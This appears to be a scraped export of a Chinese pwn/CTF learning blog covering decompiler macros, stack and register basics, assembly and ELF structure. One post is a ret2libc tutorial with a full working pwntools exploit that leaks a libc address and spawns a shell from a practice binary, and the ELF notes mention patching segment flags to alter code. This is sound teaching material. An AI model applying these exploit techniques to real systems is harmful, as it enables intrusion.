int8 sx = **SETS**(x); return ((1 ^ sx) ^ **SETS**(y2)) \u0026amp; (sx ^ **SETS**(x+y2)); } } // carry flag of subtraction (x-y) template\u0026lt;class T, class U\u0026gt; int8 **CFSUB**(T x, U y) { int size = sizeof(T) \u0026gt; sizeof(U) ? sizeof(T) : sizeof(U); if ( size == 1 ) return uint8(x) \u0026lt; uint8(y); if ( size == 2 ) return uint16(x) \u0026lt; uint16(y); if ( size == 4 ) return uint32(x) \u0026lt; uint32(y); return uint64(x) \u0026lt; uint64(y); } // carry flag of addition (x+y) template\u0026lt;class T, class U\u0026gt; int8 **CFADD**(T x, U y) { int size = sizeof(T) \u0026gt; sizeof(U) ? sizeof(T) : sizeof(U); if ( size == 1 ) return uint8(x) \u0026gt; uint8(x+y); if ( size == 2 ) return uint16(x) \u0026gt; uint16(x+y); if ( size == 4 ) return uint32(x) \u0026gt; uint32(x+y); return uint64(x) \u0026gt; uint64(x+y); } #else // The following definition is not quite correct because it always returns // uint64. The above C++ functions are good, though. #define **PAIR**(high, low) (((uint64)(high)\u0026lt;\u0026lt;sizeof(high)*8) | low) // For C, we just provide macros, they are not quite correct. #define **ROL**(x, y) **rotl**(x, y) // Rotate left #define **ROR**(x, y) **rotr**(x, y) // Rotate right #define **CFSHL**(x, y) invalid_operation // Generate carry flag for (x\u0026lt;\u0026lt;y) #define **CFSHR**(x, y) invalid_operation // Generate carry flag for (x\u0026gt;\u0026gt;y) #define **CFADD**(x, y) invalid_operation // Generate carry flag for (x+y) #define **CFSUB**(x, y) invalid_operation // Generate carry flag for (x-y) #define **OFADD**(x, y) invalid_operation // Generate overflow flag for (x+y) #define **OFSUB**(x, y) invalid_operation // Generate overflow flag for (x-y) #endif // No definition for rcl/rcr because the carry flag is unknown #define **RCL**(x, y) invalid_operation // Rotate left thru carry #define **RCR**(x, y) invalid_operation // Rotate right thru carry #define **MKCRCL**(x, y) invalid_operation // Generate carry flag for a RCL #define **MKCRCR**(x, y) invalid_operation // Generate carry flag for a RCR #define **SETP**(x, y) invalid_operation // Generate parity flag for (x-y) // In the decompilation listing there are some objects declarared as _UNKNOWN // because we could not determine their types. Since the C compiler does not // accept void item declarations, we replace them by anything of our choice, // for example a char: #define _UNKNOWN char #ifdef _MSC_VER #define snprintf _snprintf #define vsnprintf _vsnprintf #endif ","date":"2022年10月30日","permalink":"https://peterliuzhi.top/tricks/%E5%B8%B8%E8%A7%81%E5%AE%8F%E5%AE%9A%E4%B9%89/","section":"tricks","summary":"All serious daring starts from within. — Harriet Beecher Stowe 本文转载自IDA逆向常用宏定义_丑大狗的博客-CSDN博客 /* This file [contains](https://so.csdn.net/so/search?q=contains\u0026amp;spm=1001.2101.3001.7020) definitions used by the Hex-Rays decompiler output. It has type definitions and convenience macros to make the output more readable. Copyright © 2007-2011 Hex-Rays */ #if defined(**GNUC**) typedef long long ll; typedef","tags":["pwn","ida","宏"],"title":"常见宏定义"},{"categories":["principle"],"contents":" And as we let our own light shine, we unconsciously give other people permission to do the same. — Nelson Mandela\nreturn to libc(ret2libc) GOT\u0026amp;PLT 例题 分析 如何 leak 出基址？ 计算出 system 和\u0026quot;/bin/sh\u0026quot;的真实地址 构造第二个 payload 以获取系统权限 可能出现的坑 全部代码 当程序由于没有后门函数等原因无法直接栈溢出时，我们可以利用 puts、write、printf 这种输出函数来得到程序动态链接的 libc 基址（段地址），然后通过虚拟内存计算偏移得到 system、/bin/sh 的真实地址，就可以通过安排栈来实现调用 system 函数\n详细教程敬请查看该教程！感谢这位作者的付出！ 同时，感谢为我解惑并和我一起探讨问题根源的几位大佬！\nGOT\u0026amp;PLT GOT：Global Offsets Table，一开始储存 PLT 表中相对于真实地址的偏移量，当该函数调用过一次后，就储存真实地址的指针，这样调用的时候就不用再计算一次偏移量，直接就能调用外部函数了 PLT：Procedure Linkage Table，保存着函数的虚拟地址 例题 #include \u0026lt;stdio.h\u0026gt; int main { char buffer[32]; puts(\u0026#34;Simple ROP.\\n\u0026#34;); gets(buffer); return 0; } 二进制文件\n分析 当我们看到这道题的时候，我们发现了一个 puts 函数，这是一个输出函数，只要我们能够通过该函数输出 puts 函数的真实地址，这样我们就可以通过 libc 的符号表提供的偏移量计算出 libc 的基址，从而计算得到 system 和\u0026quot;/bin/sh\u0026quot;的真实地址\n如何 leak 出基址？ main_addr= elf.sym[\u0026#34;main\u0026#34;] # 这两个地址通过ROPgadget --binary vuln --only \u0026#34;pop|ret\u0026#34;找到 # 这两个属于常用的小片段 # 如果该程序中没有pop rdi;ret这个gadget，就不能用常规的思路，需要变更思路了 pop_rdi_addr = 0x4011f3 ret_addr = 0x40101a puts_plt = elf.plt[\u0026#34;puts\u0026#34;] puts_got = elf.got[\u0026#34;puts\u0026#34;] # 这里的offset为40，也就是0x28 payload1=b\u0026#39;a\u0026#39;*0x28+ p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) 此时，如果没有出问题的话，程序应该打印出了一串 bytes，我们接收这段 bytes，然后通过p.recv(6)+b'\\x00\\x00'我们就能计算出puts的真实地址\n加两个\\x00 是为了对齐\n计算出 system 和\u0026quot;/bin/sh\u0026quot;的真实地址 此时我们已经有了puts的真实地址了，我们减去符号表中puts的偏移量，就能得到基址了\n同样的逻辑，加上system和\u0026quot;/bin/sh\u0026quot;的偏移量就是它俩的真实地址了。\nlibc_base = puts_addr-libc.sym[\u0026#39;puts\u0026#39;] success(\u0026#34;libc_base:\u0026#34;+hex(libc_base)) system_addr = libc_base+libc.sym[\u0026#39;system\u0026#39;] bin_sh_addr = libc_base+next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) success(\u0026#34;system_addr:\u0026#34;+hex(system_addr)) success(\u0026#34;bin_sh_addr:\u0026#34;+hex(bin_sh_addr)) 构造第二个 payload 以获取系统权限 我们得到了需要用到的函数和函数需要使用的参数，我们现在只需要在返回值中填入适当的指令就能让程序运行我们想运行的函数了\n需要注意的是，此时我们需要注意栈对齐的情况。因为栈指针 rsp 每一次移动都是+8，所以栈地址末尾不是 8 就是 0。而要正常调用 system，就要保证最后退出时栈的最后一位地址是 0，所以我们需要在pop rdi;ret之前调用一次ret，这样既能正常执行下一句指令（将下一句指令传给了 rip），又能保证退出时栈的最后一位为 0 \u0026gt; 更多信息请查阅该博文！感谢这位作者的付出！\n可能出现的坑 程序中找不到pop rdi;ret的地址，只有pop rbp;ret的地址：编译有问题，可能是 gcc 版本导致的，可以使用我提供的二进制文件\n全部代码 from pwn import * from pwn import p64 context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) p = process(\u0026#39;./vuln1\u0026#39; ) # gdb.attach(p) p.recvuntil(\u0026#34;Simple ROP.\\n\\n\u0026#34;) elf = ELF(\u0026#39;./vuln1\u0026#39; ) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) main_addr= elf.sym[\u0026#34;main\u0026#34;] pop_rdi_addr = 0x4011f3 ret_addr = 0x40101a puts_plt = elf.plt[\u0026#34;puts\u0026#34;] puts_got = elf.got[\u0026#34;puts\u0026#34;] success(f\u0026#34;puts_plt:{hex(puts_plt)}\u0026#34;) success(f\u0026#34;puts_got:{hex(puts_got)}\u0026#34;) payload1=b\u0026#39;a\u0026#39;*0x28+ p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) success(f\u0026#34;payload1:{payload1}\u0026#34;) p.sendline(payload1) received = p.recv(6) print(received) puts_addr = u64(received+b\u0026#39;\\x00\\x00\u0026#39;) print(puts_addr) print(type(puts_addr)) success(\u0026#34;puts_addr:\u0026#34;+hex(puts_addr)) libc_base = puts_addr-libc.sym[\u0026#39;puts\u0026#39;] success(\u0026#34;libc_base:\u0026#34;+hex(libc_base)) system_addr = libc_base+libc.sym[\u0026#39;system\u0026#39;] bin_sh_addr = libc_base+next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) success(\u0026#34;system_addr:\u0026#34;+hex(system_addr)) success(\u0026#34;bin_sh_addr:\u0026#34;+hex(bin_sh_addr)) payload2=b\u0026#39;a\u0026#39;*40+p64(ret_addr)+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr) p.sendline(payload2) p.interactive() ","date":"2022年10月26日","permalink":"https://peterliuzhi.top/principle/ret2libc/","section":"principle","summary":"And as we let our own light shine, we unconsciously give other people permission to do the same. — Nelson Mandela return to libc(ret2libc) GOT\u0026amp;PLT 例题 分析 如何 leak 出基址？ 计算出 system 和\u0026quot;/bin/sh\u0026quot;的真实地址 构造第二个 payload 以获取系","tags":["pwn"],"title":"ret2libc"},{"categories":["principle"],"contents":" When we feel love and kindness toward others, it not only makes others feel loved and cared for, but it helps us also to develop inner happiness and peace. — Dalai Lama\npwndbg中显示的栈 最上方的rsp rbp栈帧指针 栈的高低区别 CALL函数 一个关于函数调用的比喻 在这个比喻的基础上解释栈溢出 在这个比喻的基础上解释局部变量 总结 pwndbg中显示的栈 ✨pwndbg中默认只显示8行stack，这在很多时候是不够用的-\u0026gt;输入stact 10显示10行，stack 20显示20行，以此类推\n最上方的rsp rsp就是栈顶指针，时刻指向当前的栈顶，pop和push后就会变化\n✨pwndbg中的栈更符合栈的概念，栈越往上则地址越小，因此低位在上，高位在下；而ida中双击变量后显示的栈则显示的是该变量的地址距离栈顶的地址差，因此有正负之分 ❔pwndbg中的栈还有很多小箭头，这是什么意思？\n这些小箭头可以理解为指针的意思，如果是'→'，表示该地址的这个位置存储的是一个地址，如果是'←'，表示存储的是数据，\n黄色表示是栈上地址，红色上色表示代码段，黑色为数据，\n有些数据还会有箭头指向别的数据，这些是“该位置存储的地址的位置存储的数据”\nfor example:\r表示0x7fffffffde50这个位置存储的数据是0x7fffffffdf78,同时0x7fffffffdf78这个位置存储的数据是0x7fffffffe2da,0x7fffffffe2da这个位置存储的数据是\"/home/linux/0/pwn/30\"\n而这种寄存器符号在左边的标识，表示当前r12的值为0x7fffffffdf78，每次pop就会从栈顶弹出一个数据到对应的寄存器中，同时rsp会+8,也就是显示为往下移一行。\rrbp栈帧指针 rbp保存的是子函数栈帧的起始地址，是它下面那一块栈（调用者的栈）的rsp，也就是相当于在最开始的时候给rsp做了一个备份（可以把rbp中的b记为backup）\n32位程序中会有esp、ebp，实际上就是rsp、rbp的32位低级版本，是他们的低四位，只有rsp、rbp的一半\n栈的高低区别 栈是从高地址向低地址增长的(栈的增长发生在调用子函数和push的时候)，向栈中写时是从低地址到高地址写\n而我们常说的大小端序是仅针对整数而言的（对字符串无效），假设现在有一个整数，它是0x123456789ABCDEF0，如果按最常见的小端序存储，在内存中：从低往高：F0 DE BC 9A 78 56 34 12 （注意，以一个字节为一个单元！） ；若使用不常见的大端序，则在内存中，从高往低：12 34 56 78 9A BC DE F0 （可以看作大端序正着读，符合人类直觉，而小端序反着读，符合计算机逻辑）\n✨另外提及一下在这方面很蠢的ida，例如一个整型数：0x41424344，由于是小端序，内存中存储的是 44 43 42 41，翻译成字符串就是\u0026quot;DCBA\u0026quot;，但是当你在ida中右键标注这个整型数据为字符串时，ida会显示：\u0026ldquo;ABCD\u0026rdquo;,所以在这种情况下脑子里自己给它倒过来。\nCALL函数 完整的函数调用过程要有几个语句实现的，\n在这里，main函数中call了一个用户自定义函数vuln，此时将vuln所在地址传给rip寄存器(rip寄存器是所有寄存器中最神奇的寄存器，神奇之处在于rip保存的值是什么，程序就会执行哪个地址的指令)，传了以后，程序转到vuln函数执行，这个时候rbp和rsp还未发生变化。\n接着，看到vuln函数的指令第一句：push rbp，将rbp当前的值压入栈中，在栈中保存rbp原来的值(用C语言去理解就是新建了一个变量来保存rbp原来的值)，\n紧接着下一句：mov rbp, rsp，将rsp当前的值传入rbp，用rbp保存rsp原有的值，所以说rbp是给rsp做备份用的。\n而有趣的是，当前的rbp所存储的地址，它这里的数据是什么呢，就是原rbp。\ncall除了改变rip，还将call所在的位置的下一条指令的地址压入了栈中，也就是：返回地址。 也就是说，函数调用第一个压入返回地址，第二个压入原rbp的值。当函数返回的时候，执行leave和ret两条指令，（leave等同于：mov rsp, rbp; pop rbp），两条语句把之前的rsp和rbp的值都恢复了，接着执行ret，作用是：pop rip（可能只是因为用得多，而且都用于返回，才写成ret，实际上与pop rip完全等价。），那么pop rip，就是将函数调用前保存的返回地址送进rip寄存器，下一句指令就会到那里执行，于是可以看到在函数返回的时候，栈结构被恢复成函数被调用前的样子了。\n在leave（mov rsp, rbp; pop rbp）时，这里在执行pop rbp时，rsp因为已经被赋值为rbp当前值，而之前就提到过rbp所指位置存储的数据时原rbp，所以pop rbp就会将当前rsp所指，也是rbp所指的数据弹到rbp，恢复rbp原有值，然后rsp指向了rbp原有的值，紧接着又pop了一次，那么在上次pop了栈顶上保存的原rbp后，新的栈顶数据是什么呢？没错，比原rbp早一步被压入的：返回地址\n一个关于函数调用的比喻 调用子函数的全过程由以下几条语句组成： （调用者函数 caller） call xxx （跳转到被调用函数 callee） push rbp mov rbp, rsp sub rsp, 以上四个语句就是整个标准的函数调用流程，当完成这个流程时，栈空间往低地址增长。\n如果用一个很奇怪的比喻来解释栈的增长，和栈中数据的rwx，就是你面前有一辆火车，火车内的空间代表栈空间，火车内的乘客代表数据，左边是低地址，右边是高地址，乘客在火车里面永远是先坐满最左边的那一排，再逐渐往右坐，这代表write的顺序，乘务员点人的时候也永远是从左边往右边点，这代表read的顺序\n而当发生了调用子函数的事件时，列车组人员会再拉来一列车厢，接在火车的最左边，这是栈往低地址增长。然后这个时候乘客要上车，是在那个新加上去的那节车厢从左往右坐。火车是从右往左加车厢的，栈空间增长就是在低地址那边加了节车厢，乘客永远先坐整辆火车的最左边。\npush是在最左边加一排座位并且从寄存器那里揪一排人摁进去，pop是把那排的人推进寄存器然后拆掉那排座位。\npush的时候，寄存器的值被压入栈，但是寄存器的值没有改变。pop的时候，rsp所指（栈顶）数据进入寄存器，并且rsp下移，此时表现为栈顶数据从栈中消失，但是那个地址只是不再位于栈的范围了，里面存储的数据没有改变。\n继续修改上面的奇怪比喻的话，那就是，push的时候加了排座位，并且从指定的寄存器那复制了一排人摁到了座位上;pop的时候先把原来最左边座位上的人复制一遍拖到指定的寄存器那里，再把座位拆掉，然后原本在那坐的人就站着了，但是他们“不属于火车上的人了”。\n函数返回的时候就是把那节现在不知道多长的车厢拔掉。\n然后当拔掉一节车厢时，只是车厢被拔掉了，人还站在原来的位置，站在铁轨上，如果那里又加了一节车厢，他们就到车厢里继续坐原来的位置（加车厢对应call函数，加座位是push）\n除非出现例外情况：例如拆座位拆到最左边整节车厢都拆空了，这时候如果继续拆会拆到下一节，这时要是再返回程序一般就出错了。\n在这个比喻的基础上解释栈溢出 那就是乘客在最左边的一节车厢上车，却因为车厢坐满了直接坐到了车厢之间的连通处，连通处存着的返回地址直接给坐没了（\n在这个比喻的基础上解释局部变量 乘客不是永远从“最左边”开始坐，而且基本不会从最左边（rsp）开始，真正开始坐的位置是局部变量的位置\n当函数中声明局部变量时，编译器就确定了该变量相对于rbp的偏移量，相当于在车厢某个位置画了条线，写上那个变量的名字 当有gets一类读取输入的时候，编译器会为其预留“座位” 不管怎样，变量（乘客）总是从低到高（从左到右）写入（入座）的 总结 ","date":"2022年10月26日","permalink":"https://peterliuzhi.top/principle/%E5%85%B3%E4%BA%8E%E6%A0%88%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"principle","summary":"When we feel love and kindness toward others, it not only makes others feel loved and cared for, but it helps us also to develop inner happiness and peace. — Dalai Lama pwndbg中显示的栈 最上方的rsp rbp栈帧指针 栈的高低区别 CALL函数 一个关于函数","tags":["pwn","栈"],"title":"关于栈的一些基础知识"},{"categories":["tricks"],"contents":" Prejudice is a burden that confuses the past, threatens the future and renders the present inaccessible. — Maya Angelou\n一个非常简易的向用户读取输入姓名，将其显示在屏幕上，同时用hello world向其问候的程序在C语言中极其简便，但是在汇编中我们不得不去手动安排栈段与数据段，我们还得时刻注意栈的变化，防止从函数返回时无法返回到正确的位置\n源代码 assume cs:code, ds:data, ss:stack data segment StringToPrint db \u0026#34;Hello World!\u0026#34;, 13, 10, \u0026#34;$\u0026#34; StringForRead db \u0026#34;Please Input Your Name:\u0026#34;, \u0026#34;$\u0026#34; Input db 0ah, 20 dup(\u0026#34;$\u0026#34;) data ends stack segment db 128 dup (0) stack ends code segment start: mov ax, data mov ds, ax mov ax, stack mov ss, ax mov sp, 128 mov bp, sp mov ax, offset StringForRead push ax call read mov ax, offset StringToPrint push ax call puts mov ah,4ch int 21h puts: pop si pop dx push si push bp mov bp, sp mov ah, 09h int 21h mov sp, bp pop bp ret read: pop si pop ax push si push bp mov bp, sp push ax call puts mov di, offset Input + 1 mov bx, 17 get: mov cx, bx jcxz ok mov ah, 01h int 21h mov ch, 0 mov cl, al sub cl, 0dh jcxz ok mov ds:[di], al inc di dec bx jmp get ok: show: mov al, \u0026#34;,\u0026#34; mov ds:[di], al mov ax, offset INPUT push ax call puts mov sp, bp pop bp ret code ends end start 输出结果：\n分析 在数据段中我们定义了我们需要用到的各种数据，同时还有一段固定长度用于保存姓名的空间（在实际上的C程序中，局部变量是放在栈中的，通过将rsp减一定的值，在rbp和rsp之间空出一段空间来存储变量）\ndata segment StringToPrint db \u0026#34;Hello World!\u0026#34;, 13, 10, \u0026#34;$\u0026#34; StringForRead db \u0026#34;Please Input Your Name:\u0026#34;, \u0026#34;$\u0026#34; Input db 0ah, 20 dup(\u0026#34;$\u0026#34;) ;用来保存输入 data ends stack segment db 128 dup (0) ;栈的总大小为128个字节 stack ends 然后我们定义了类似C语言中的main函数：\nstart: mov ax, data mov ds, ax mov ax, stack mov ss, ax mov sp, 128 mov bp, sp ;备份sp mov ax, offset StringForRead ；将需要的数据入栈 push ax call read ;调用read函数 mov ax, offset StringToPrint push ax mov bp, sp call puts mov ah,4ch int 21h 然后我们去实现这两个函数\nPUTS:\nputs: pop si ;call的时候会将下一条指令地址进栈 pop dx ;取出参数 ;实际上64位系统的参数保存至寄存器中， ;而32位系统的参数保存在栈中， ;详情见前面的笔记 push si ;重新进栈让ret指令能够返回 push bp ;备份bp mov bp, sp ;备份sp mov ah, 09h ;09h告诉dos系统打印一个字符串 int 21h ;打印 mov sp, bp ;恢复sp的值 pop bp ;恢复bp的值 ;这两句话相当于leave指令 ret ;相当于pop rip ;返回call的下一条指令的地址 READ:\nread: pop si pop ax ;取出参数 push si push bp ;备份 mov bp, sp push ax ;要调用函数的话还要将参数进栈 ;这里如果不先出栈再进栈 ;那么参数会变成call下一条指令地址 call puts mov di, offset Input + 1 ;越过开头的换行符 mov bx, 17 ;通过bx控制最多能输入的字符数 ;（去掉前后两个换行符，终止符） get: mov cx, bx ;将bx的值传给cx jcxz ok ;如果cx=0就跳到ok ;相当于如果bx=0就跳出 mov ah, 01h ;01h代表读取单个字符 int 21h mov ch, 0 ;将cx高位设为0 mov cl, al sub cl, 0dh ;如果输入回车符cx就为0 jcxz ok ;所以输入回车就结束 mov ds:[di], al ;将字符保存在变量空间中 inc di ;相当于增加数组指针 dec bx ;减少bx，直至0 jmp get ;继续读取输入 ok: show: mov al, \u0026#34;,\u0026#34; ;在名字后加逗号 mov ds:[di], al mov ax, offset INPUT push ax ;将要puts打印的字符串地址入栈 call puts mov sp, bp ;恢复sp pop bp ;恢复bp ret ;返回 ","date":"2022年10月26日","permalink":"https://peterliuzhi.top/tricks/%E6%B1%87%E7%BC%96%E7%89%88hello-world/","section":"tricks","summary":"Prejudice is a burden that confuses the past, threatens the future and renders the present inaccessible. — Maya Angelou 一个非常简易的向用户读取输入姓名，将其显示在屏幕上，同时用hello world向其问候的程序在C语言中极其简便，","tags":["pwn"],"title":"汇编版hello world"},{"categories":["principle"],"contents":" Kindness is the language which the deaf can hear and the blind can see. — Mark Twain\n汇编与寄存器 寄存器 在16位系统中（8086CPU） 数据寄存器 变址寄存器 指针寄存器 段寄存器 指针指令寄存器 在32位系统中（i386） 在64位系统中（amd64） 汇编 系统如何执行汇编代码 将对应指针寄存器指向对应段 代码 栈 数据 PUSH指令和POP指令 寄存器 在16位系统中（8086CPU） 数据寄存器 用于暂存数据的寄存器有AX、BX、CX、DX，这些寄存器可以起到暂存16位的数据的作用。每一个又可以分成高八位和低八位，如AX寄存器，高八位为AH，低八位为AL，将超出八位的数据存入AH或AL不会自动将数据填入AX的剩下空间，而是会溢出，产生数据丢失\n寄存器AX和AL通常称为累加器(Accumulator)，用累加器进行的加减乘除耗时更少 寄存器BX称为基地址寄存器(Base Register)，可作为存储器指针来使用 寄存器CX称为计数寄存器(Count Register)。在循环和字符串操作时，要用它来控制循环次数（循环的次数保存在CX中，每循环一次CX就减一，直至0循环停止） 寄存器DX称为数据寄存器(Data Register)。在进行乘、除运算时，它可作为默认的操作数参与运算，也可用于存放I/O的端口地址 变址寄存器 SI和DI称为变址寄存器，用于存放存储单元在段内的偏移量，SI储存源地址（source index），DI储存目的地址（destination index）\n指针寄存器 BP、SP称为指针寄存器，SP是堆栈指针（stack pointer），存放栈顶地址；BP是基址指针（base pointer），存放堆栈基址偏移，相当于为最开始的SP做备份（见上节RBP和RSP的讲解）\n段寄存器 CS、DS、SS、ES被称为段寄存器，用于储存段地址，需要和偏移量一起使用才能查找到内存中的数据。\nCS为代码段（code segment），和IP寄存器一起使用，用于确定下一条指令的地址 DS为数据段（stack segment），用于存储数据所在的段地址，和诸如[0]一类的表达一起使用，如果没有特别说明，[0]==DS:[0] SS为堆栈段（stack segment），和SP寄存器一起使用，用于确定堆栈的位置，长期指向栈顶 ES为扩展段(extend segment)，为扩展的段寄存器 指针指令寄存器 IP被称作指针指令寄存器，储存相对于段寄存器CS的偏移量，在内存中找到CS:IP处的指令并执行\n在32位系统中（i386） 在AX、BX、CX、DX等前面加E，变成了EAX、EBX、ECX、EDX等，而原本的AX、BX、CX、DX等成为了其低16位，而存取它的高十六位可以通过移位操作进行（向左移16位），或者通过bswap EAX进行（交换EAX的高、低位）\n在16位CPU中，AX、BX、CX和DX不能作为基址和变址寄存器来存放存储单元的地址，但在32位CPU中，其32位寄存器EAX、EBX、ECX和EDX不仅可传送数据、暂存数据保存算术逻辑运算结果，而且也可作为指针寄存器，所以，这些32位寄存器更具有通用性\n在64位系统中（amd64） 将32位中的E前缀改为了R前缀，而原本32位中的名称用来代指64位中寄存器的低位，同时64位系统增加了8个通用寄存器，命名为R8~R15，在其后加上d，w，b指定长度（d最长，b最短）\n因此64位系统中的寄存器比32位要多8个\n✨ 32位系统中，函数的传递参数保存在栈帧中，而64位系统保存在寄存器中，分别用RDI,RSI,RDX,RCX,R8,R9作为第1-6个参数，用RAX保存返回值\n汇编 系统如何执行汇编代码 当我们执行一个exe文件时，系统会将这个exe文件载入内存，并且将（R\\E）CS:（R\\E）IP指向这块内存的最低地址，每执行一句IP就自动增加（长度不固定），而所要执行的这一段代码在汇编内称为代码段。\n同时，exe文件还会有它的栈段和数据段，这两段地址在内存中用汇编指令dw(define word)声明，dw 0就是声明一个为0的字（两个字节），dw 0,0就是声明两个字\ndata segment dw 0123h, 0456h, 0789h, 0abch, 0defh, 0fedh, 0cbah, 0987h data ends stack segment dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 stack ends 将对应指针寄存器指向对应段 我们的栈、数据、代码在哪里完全取决于对应的段寄存器和指针寄存器、指针指令寄存器指向哪里\n因此，我们需要改变对应寄存器的值\n代码 我们需要设置CS:IP，使其指向代码被载入的内存处\n在汇编中，只需要在需要执行的代码前加上start:，最后end start即可\ncode segment start: mov ax, stack mov ss, ax mov sp, 100h ;初始化栈指针 mov ax, data mov ds,ax ;初始化内存指针 code ends end start 栈 需要将SS指向栈段，并设置SP指向栈底（一开始栈为空）\nmov ax, stack mov ss, ax mov sp, 100h ;初始化栈指针 数据 将DS指向数据段，就可以用[0]式的表达式存取数据了\nmov ax, data mov ds,ax ;初始化内存指针 PUSH指令和POP指令 PUSH指令和POP指令均不会变更原来的数据，而是变更目的地的数据。\npush ds:[0]就是把数据段中ds:[0]处的数据推入栈中，相当于mov ss:sp ds:[0] pop ds:[0]就是把栈顶的数据弹入ds:[0]中，相当于mov ds:[0] ss:sp ","date":"2022年10月26日","permalink":"https://peterliuzhi.top/principle/%E6%B1%87%E7%BC%96%E4%B8%8E%E5%AF%84%E5%AD%98%E5%99%A8/","section":"principle","summary":"Kindness is the language which the deaf can hear and the blind can see. — Mark Twain 汇编与寄存器 寄存器 在16位系统中（8086CPU） 数据寄存器 变址寄存器 指针寄存器 段寄存器 指针指令寄存器 在32位系统中","tags":["pwn"],"title":"汇编与寄存器"},{"categories":["principle"],"contents":" Myths which are believed in tend to become true. — George Orwell\nELF详解 什么是ELF 使用readelf命令读取elf文件 ELF文件类型 ELF程序头（描述段的头） PT_LOAD PT_DYNAMIC（动态链接可执行文件特有） PT_NOTE PT_INTERP PT_PHDR ELF节头（section header） 段和节的区别 节头 .text节 .rodata节 .data节 .bss节 .plt节 .got与.got.plt节 为什么有了.plt还要有.got呢？ got表的结构 .ctors和.dtors节 ELF符号 .symtab节 .strtab节 .dynsym节 .dynstr节 .rel.*节 .hash节 .shstrtab节 ELF重定位 Relocation 基于二进制修补的重定位代码注入 什么是ELF ELF（Executable and Linkable Format）是一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件的文件格式，目前已经成为Unix和类Unix操作系统的标准二进制格式，目前常见的Linux、Android可执行文件、共享库（.so）、目标文件（ .o）以及Core 文件均为此格式\n使用readelf命令读取elf文件 readelf -S 查询节头表 -l 查询程序头表 -s 查询符号表 -e 查询ELF文件头数据 -r 查询重定位入口 -d 查询动态段 ELF文件类型 使用ELF格式的文件可以被标记为以下五种格式：\n未知类型ET_NONE 重定位文件ET_REL，通常是还没有经过链接的一段独立代码，也就是.o文件 可执行文件ET_EXEC，这个就不用说了~ 共享目标文件ET_DYN，就是动态链接库 核心文件ET_CORE，程序崩溃或产生SIGSEGV信号的时候会在此文件中记录整个进程的镜像信息，从而被GDB读取复盘 我们可以通过readelf -h命令来查看原始的ELF文件头：\n$ readelf -h babyrop ELF 头： Magic： 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 类别: ELF64 数据: 2 补码，小端序 (little endian) Version: 1 (current) OS/ABI: UNIX - System V ABI 版本: 0 类型: EXEC (可执行文件) 系统架构: Advanced Micro Devices X86-64 版本: 0x1 入口点地址： 0x4004e0 程序头起点： 64 (bytes into file) Start of section headers: 6768 (bytes into file) 标志： 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 9 Size of section headers: 64 (bytes) Number of section headers: 31 Section header string table index: 28 readelf是怎么找到ELF头在哪里呢？答案就是ELF头从二进制文件的0号地址，也就是文件的开头开始，就好像一篇论文在一开始会对整个论文做概述一样，ELF文件头是对剩余部分的一个映射\nELF文件头告诉了我们：\n这个文件是啥类型的文件 这个文件的结构 程序开始执行的入口地址 其他ELF头（节头、程序头）的地址（偏移量） ELF程序头（描述段的头） 在原始的ELF头中我们记录了ELF程序头的地址（e_phoff），这样我们就能得到程序头表\nELF程序头是对二进制文件中段的描述，是程序必需的一部分。\n我们知道，一个程序想要运行，首先要把它装载到内存上，而这个ELF程序头就相当于一本程序装载的说明书，告诉你每个段是怎样的。\n我们可以通过readelf -l来查询程序头表：\n$ readelf -l babyrop Elf 文件类型为 EXEC (可执行文件) Entry point 0x4004e0 There are 9 program headers, starting at offset 64 程序头： Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000400040 0x0000000000400040 0x00000000000001f8 0x00000000000001f8 R E 0x8 INTERP 0x0000000000000238 0x0000000000400238 0x0000000000400238 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000 0x0000000000000814 0x0000000000000814 R E 0x200000 LOAD 0x0000000000000e10 0x0000000000600e10 0x0000000000600e10 0x0000000000000240 0x0000000000000248 RW 0x200000 DYNAMIC 0x0000000000000e28 0x0000000000600e28 0x0000000000600e28 0x00000000000001d0 0x00000000000001d0 RW 0x8 NOTE 0x0000000000000254 0x0000000000400254 0x0000000000400254 0x0000000000000044 0x0000000000000044 R 0x4 GNU_EH_FRAME 0x00000000000006e8 0x00000000004006e8 0x00000000004006e8 0x0000000000000034 0x0000000000000034 R 0x4 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x10 GNU_RELRO 0x0000000000000e10 0x0000000000600e10 0x0000000000600e10 0x00000000000001f0 0x00000000000001f0 R 0x1 Section to Segment mapping: 段节... 00 01 .interp 02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 03 .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 04 .dynamic 05 .note.ABI-tag .note.gnu.build-id 06 .eh_frame_hdr 07 08 .init_array .fini_array .jcr .dynamic .got ELF程序头有一些常见的类型，下面我们来介绍一下它们\nPT_LOAD 这类程序头描述的是可以被装载的段，根据这个头，我们将需要的段装载/映射到内存中\n一个动态链接的ELF可执行文件通常包括：\ntext段：存放程序代码（通常可读可执行PF_R|PF_X） data段：全局变量和动态链接信息（通常可读可写PF_R|PF_W） 我们可以更改程序头中p_flags处增加PF_W标记来修改text段权限，从而扭曲原本的代码\nPT_DYNAMIC（动态链接可执行文件特有） 它包括了：\n动态链接的库列表 DT_NEEDED：共享库名的字符串表的偏移量 GOT表的地址 